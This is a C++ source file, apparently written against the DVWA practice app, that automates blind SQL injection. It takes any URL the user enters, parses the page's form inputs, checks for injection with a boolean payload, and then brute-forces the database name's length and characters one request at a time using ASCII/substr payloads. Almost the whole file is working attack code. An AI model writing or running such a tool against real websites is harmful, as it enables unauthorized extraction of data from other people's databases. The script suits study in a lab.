#include <iostream>
#include <string>
#include <fstream>
#include <vector>
#include <curl/curl.h>
#include <sstream>
#include <tuple>
using namespace std;
// Callback function to store response data
size_t WriteCallback(char *ptr, size_t size, size_t nmemb, std::string *userdata)
{
    size_t len = size * nmemb;
    userdata->append(ptr, len);
    return len;
}

std::vector<int> compute_prefix(const std::string& pattern)
{
    int n = pattern.size();
    std::vector<int> prefix(n);
    prefix[0] = 0;

    int j = 0;
    for (int i = 1; i < n; i++)
    {
        while (j > 0 && pattern[j] != pattern[i])
        {
            j = prefix[j-1];
        }
        if (pattern[j] == pattern[i])
        {
            j++;
        }
        prefix[i] = j;
    }

    return prefix;
}


// Search for the pattern within the text using the KMP algorithm
size_t Find(const std::string& text, const std::string& pattern)
{
    int n = text.size();
    int m = pattern.size();

    // Compute the prefix function for the pattern
    std::vector<int> prefix = compute_prefix(pattern);

    int j = 0;
    for (int i = 0; i < n; i++)
    {
        while (j > 0 && pattern[j] != text[i])
        {
            j = prefix[j-1];
        }
        if (pattern[j] == text[i])
        {
            j++;
        }
        if (j == m)
        {
            // Found a match at position i-m+1
            return i-m+1;
        }
    }

    // Pattern not found
    return std::string::npos;
}

std::string get_attribute_value(const std::string& tag, const std::string& attr_name)
{
    // Find the position of the attribute name in the tag
    size_t attr_pos = tag.find(attr_name);
    if (attr_pos == std::string::npos)
    {
        // Attribute not found
        return "";
    }

    // Find the value of the attribute
    size_t value_pos = tag.find("=", attr_pos);
    if (value_pos == std::string::npos)
    {
        // Attribute value not found
        return "";
    }

    // Skip the "=" character and any whitespace
    value_pos = tag.find_first_not_of(" \t", value_pos + 1);
    if (value_pos == std::string::npos)
    {
        // Attribute value not found
        return "";
    }

    // Find the end of the attribute value
    size_t value_end_pos = value_pos;
    if (tag[value_pos] == '\"' || tag[value_pos] == '\'')
    {
        // Attribute value is enclosed in quotes
        char quote_char = tag[value_pos];
        value_end_pos = tag.find(quote_char, value_pos + 1);
        if (value_end_pos == std::string::npos)
        {
            // Attribute value not properly terminated
            return "";
        }
    }
    else
    {
        // Attribute value is not enclosed in quotes
        value_end_pos = tag.find_first_of(" \t", value_pos);
        if (value_end_pos == std::string::npos)
        {
            // Attribute value extends to the end of the tag
            value_end_pos = tag.size();
        }
    }

    // Extract the attribute value and return it
    return tag.substr(value_pos+1, value_end_pos - value_pos-1);
}

// Extract parameters from an HTML file
std::vector<std::tuple<std::string, std::string, std::string>> extract_parameters(const std::string html)
{
    // Open the HTML file


    // Read the contents of the file into a string

    // Find all input tags in the HTML string
    std::vector<std::tuple<std::string, std::string, std::string>> params;
    size_t pos = 0;
    while ((pos = html.find("<input", pos)) != std::string::npos)
    {
        // Extract the tag and find the value of the "name", "type", and "value" attributes
        std::string tag = html.substr(pos, html.find(">", pos) - pos + 1);
        std::string name = get_attribute_value(tag, "name");
        std::string type = get_attribute_value(tag, "type");
        std::string value = get_attribute_value(tag, "value");
        if (!name.empty())
        {
            params.emplace_back(name, type, value);
        }
        pos += tag.size();
    }

    // Return the parameter names, types, and values
    return params;
}
string sendHttpRequest(string url)
{
    string response;
    CURL *curl = curl_easy_init();
    if (!curl)
    {
        std::cerr << "Failed to initialize curl\n";
        return "";
    }
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

    curl_easy_setopt(curl, CURLOPT_HEADERDATA, NULL);
    curl_easy_setopt(curl, CURLOPT_HEADER, 1);

    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK)
    {
        std::cerr << "Failed to perform curl request: " << curl_easy_strerror(res) << "\n";
        curl_easy_cleanup(curl);
        return "";
    }

    if (response.empty())
    {
        std::cerr << "Empty response data\n";
    }
    curl_easy_cleanup(curl);
    return response;


}


int find_dbname_length(string url,vector<std::tuple<std::string, std::string, std::string>> params)
{

    int length;
    std::string response;
    std::string successmessage="exists";
    std::string payload="1'AND+length(database())+=";
    std::string fixedpayload="%23&Submit=Submit";

    url+="/?";

    for(int i=1; i<=6; i++)
    {
        int cnt=1;
        string url1=url;
        for (const auto& param : params)
        {
            std::string para="";
            if(cnt==1)
            {
                std::string s=std::to_string(i);
                //url="http://localhost/DVWA-master/vulnerabilities/sqli_blind/?id="+payload+s+fixedpayload;
                url1+=get<0>(param)+"="+payload+s+"%23";
                cnt++;
            }
            else if(std::get<1>(param)=="submit"&&std::get<0>(param).length()!=0&&std::get<2>(param).length()!=0)
            {
                url1+="&"+get<0>(param)+"="+get<2>(param);
                cnt++;
            }
            else if(std::get<1>(param)=="submit"&&std::get<0>(param).length()!=0&&std::get<2>(param).length()==0)
            {
                url1+="&"+get<0>(param)+"="+"Submit";
                cnt++;
            }
            else
            {
                url1+="&"+get<0>(param)+"="+para;
                cnt++;
            }
        }
        cout << url1 <<"\n";
        response=sendHttpRequest(url1);
        //cout << response <<"\n";
        if(Find(response,successmessage)!=std::string::npos)
        {
            length=i;
            break;
        }
    }
    return length;

}

std::string find_dbname(string url,vector<std::tuple<std::string, std::string, std::string>> params,int length)
{
    url+="?";
    std::string name="";
    std::string successmessage="exists";
    std::string payloadpart1="1'+AND+(ascii(substr((select+database()),";
    std::string payloadpart2=",1)))+=+";
    for(int i=1; i<=length; i++)
    {
        string response;

        std::string s1=std::to_string(i);
        for(int j=1; j<128; j++)
        {
            int cnt=1;
            string url1=url;
            for (const auto& param : params)
            {
                std::string para="";
                if(cnt==1)
                {
                    //std::string s=std::to_string(j);
                    //url="http://localhost/DVWA-master/vulnerabilities/sqli_blind/?id="+payload+s+fixedpayload;
                    url1+=get<0>(param)+"="+payloadpart1+to_string(i)+payloadpart2+to_string(j)+"%23";
                    cnt++;
                }
                else if(std::get<1>(param)=="submit"&&std::get<0>(param).length()!=0&&std::get<2>(param).length()!=0)
                {
                    url1+="&"+get<0>(param)+"="+get<2>(param);
                    cnt++;
                }
                else if(std::get<1>(param)=="submit"&&std::get<0>(param).length()!=0&&std::get<2>(param).length()==0)
                {
                    url1+="&"+get<0>(param)+"="+"Submit";
                    cnt++;
                }
                else
                {
                    url1+="&"+get<0>(param)+"="+para;
                    cnt++;
                }
            }
            //cout << url1 <<"\n";
            response=sendHttpRequest(url1);
            //cout << response <<"\n";
            if(Find(response,successmessage)!=std::string::npos)
            {
                std::cout << i<<" character of dbname is : "<<(char)j<<"\n";
                name.push_back((char)j);
                break;
            }
        }

    }
    return name;

}


int main()
{

    std::string payload="1'+AND+4570=4570+AND+'ZeoB'='ZeoB";


    bool vulnerable=false;

    std::string response;

    std::string url ;
    std:: cout <<"Enter the url: \n";
    std::string successmessage="exists";
    std::string errormessage="MISSING";

    std::cin >> url;
    response=sendHttpRequest(url);


    std::cout <<"Used payload : "<<payload<<"\n......................\n";

    std::vector<std::tuple<std::string, std::string, std::string>> params = extract_parameters(response);

    // Print the parameter names
    std::string url1=url;
    url1+="?";
    int cnt=1;
    for (const auto& param : params)
    {
        // std::cout <<"Enter the value of " <<get<0>(param) << "\n";
        std::string para="";
        if(cnt==1)
        {
            url1+=get<0>(param)+"="+payload;
            cnt++;
        }
        else if(std::get<1>(param)=="submit"&&std::get<0>(param).length()!=0&&std::get<2>(param).length()!=0)
        {
            url1+="&"+get<0>(param)+"="+get<2>(param);
        }
        else if(std::get<1>(param)=="submit"&&std::get<0>(param).length()!=0&&std::get<2>(param).length()==0)
        {
            url1+="&"+get<0>(param)+"="+"Submit";
        }
        else
        {
            url1+="&"+get<0>(param)+"="+para;
            cnt++;
        }
    }
    std::cout << url1 << "\n";
    string response2=sendHttpRequest(url1);

    // std::cout << "Response: " << response2 << "\n";
    if(Find(response2,successmessage)!=std::string::npos)
    {
        vulnerable=true;
    }




    if(vulnerable)
    {
        std::cout << "The website is vulnerable to Blind SQL injection\n";
    }
    else std::cout << "The website is not vulnerable.Sorry we can not do any further work\n";

    if(vulnerable)
    {
        int len=find_dbname_length(url,params);
        std::cout << "Length of the database name is "<< len << "\n";

        std::string name=find_dbname(url,params,len);
        std::cout << "Database name is "<< name<< "\n";
    }
    return 0;
}
